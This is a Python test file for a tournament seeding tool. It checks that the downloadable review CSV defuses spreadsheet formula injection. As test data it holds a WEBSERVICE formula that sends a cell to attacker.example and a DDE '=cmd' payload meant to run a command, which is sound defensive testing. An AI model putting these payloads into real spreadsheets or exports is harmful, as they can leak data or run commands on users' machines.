"""The seeding review CSV must not hand a spreadsheet a live formula.

`Team`, `Matched to` and `Candidates` carry provider-authored text — a team is
registered under whatever name its club typed, and `Candidates` is filled from a
GotSport search. CSV quoting does not help: Excel, Sheets and Numbers decide a
cell is a formula from its first character, inside quotes or not.

These drive `_render_seeding_tab` rather than the helper, because the guard is a
wiring decision. `csv_safe` has its own tests; what is untested without this is
whether the export actually calls it, and the on-screen frame deliberately does
not, so asserting on the frame would prove nothing.
"""

from __future__ import annotations

import pandas as pd
import pytest

import tournament_intake
from src.tournaments.roster_paste import ParsedRoster, RosterRow
from src.tournaments.roster_resolver import ResolvedTeam
from tests.unit.test_seeding_event_intake import _FakeSt, _install

FORMULA_NAME = '=WEBSERVICE("http://attacker.example/?x="&A1)'


def _row() -> RosterRow:
    return RosterRow(
        source_index=0,
        club_raw="Real FC",
        team_name_raw=FORMULA_NAME,
        state="",
        section_age_group="u13",
        section_gender="Male",
        team_name_stripped=FORMULA_NAME,
        has_star_marker=False,
        has_c_marker=False,
    )


def _render(monkeypatch, frame: pd.DataFrame) -> bytes:
    """Render the tab with one unresolved row and return the CSV the operator gets."""
    parsed = ParsedRoster(rows=(_row(),), warnings=())
    resolved = (ResolvedTeam(source_index=0, status="unresolved"),)

    fake_st = _install(monkeypatch, _FakeSt())
    fake_st.session_state._seeding_result = (parsed, resolved)
    fake_st.session_state._seeding_overrides = {}

    for name in (
        "_render_seeding_run_controls",
        "_render_seeding_event_scrape",
        "_render_seeding_warnings",
        "_render_seeding_save",
        "_render_seeding_enqueue",
        "_render_seeding_sheet",
        "_render_seeding_override",
    ):
        monkeypatch.setattr(tournament_intake, name, lambda *a, **kw: None)
    monkeypatch.setattr(tournament_intake, "_seeding_result_frame", lambda *a, **kw: frame)

    tournament_intake._render_seeding_tab(None)

    assert fake_st.download_payloads, "the review CSV was never offered"
    payload = fake_st.download_payloads[-1]
    assert isinstance(payload, (bytes, bytearray)), type(payload)
    return bytes(payload)


@pytest.mark.parametrize(
    "column",
    ["Team", "Matched to", "Candidates"],
)
def test_a_formula_leading_field_is_defanged_in_the_download(monkeypatch, column):
    frame = pd.DataFrame([{"Status": "Not found", "Team": "x", "Matched to": "y", "Candidates": "z"}])
    frame.loc[0, column] = FORMULA_NAME

    csv = _render(monkeypatch, frame).decode("utf-8")

    assert "'=WEBSERVICE" in csv, f"{column} reaches the spreadsheet as a live formula"
    assert '"=WEBSERVICE' not in csv


@pytest.mark.parametrize("payload", ["+1+1", "-1+1", "@SUM(A1)", "\t=cmd|'/c calc'!A1"])
def test_every_prefix_a_spreadsheet_treats_as_a_formula_is_covered(monkeypatch, payload):
    """Tab is included deliberately: some Excel import paths skip leading whitespace
    before deciding a cell is a formula."""
    frame = pd.DataFrame([{"Status": "Not found", "Team": payload, "Matched to": "y", "Candidates": "z"}])

    csv = _render(monkeypatch, frame).decode("utf-8")

    assert "'" + payload[0] in csv or "'" + payload[:2] in csv, f"{payload!r} was not defanged"


def test_an_ordinary_name_is_not_altered(monkeypatch):
    """The guard must not corrupt the 99.99% case the operator actually reads."""
    frame = pd.DataFrame(
        [{"Status": "Not found", "Team": "Real FC 2013 Blue", "Matched to": "", "Candidates": ""}]
    )

    csv = _render(monkeypatch, frame).decode("utf-8")

    assert "Real FC 2013 Blue" in csv
    assert "'Real FC" not in csv


def test_a_numeric_cell_survives_as_a_number(monkeypatch):
    frame = pd.DataFrame([{"Status": "Not found", "#": 7, "Team": "Real FC", "Matched to": "", "Candidates": ""}])

    csv = _render(monkeypatch, frame).decode("utf-8")

    assert ",7," in csv or csv.rstrip().endswith(",7") or "7," in csv
    assert "'7" not in csv


def test_only_the_rows_needing_a_decision_are_exported(monkeypatch):
    frame = pd.DataFrame(
        [
            {"Status": "Not found", "Team": "Needs me", "Matched to": "", "Candidates": ""},
            {"Status": "Matched by GotSport id", "Team": "Already done", "Matched to": "", "Candidates": ""},
        ]
    )

    csv = _render(monkeypatch, frame).decode("utf-8")

    assert "Needs me" in csv
    assert "Already done" not in csv
